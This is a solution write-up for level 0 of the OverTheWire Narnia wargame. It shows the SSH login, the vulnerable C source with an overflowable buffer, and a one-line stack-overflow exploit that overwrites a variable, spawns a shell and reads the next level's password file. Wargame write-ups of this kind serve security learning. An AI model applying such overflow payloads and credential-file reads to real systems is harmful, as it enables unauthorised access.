#Narnia Solutions
[http://www.overthewire.org/wargames/narnia/](http://www.overthewire.org/wargames/narnia/)

```
Narnia's levels are called narnia0, narnia1, ... etc. and can be accessed on narnia.labs.overthewire.org through SSH.
Data for the levels can be found in /narnia/.
```

##Level 0:

    ssh narnia0@narnia.labs.overthewire.org

pass is `narnia0`

```
cd /narnia
ls
cat narnia0.c
```

```
narnia0@melinda:/narnia$ cat narnia0.c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef)
        system("/bin/sh");
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

```
((echo -e "aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde"; exit;); echo 'whoami'; echo 'cat /etc/narnia_pass/narnia1' )| ./narnia0 
```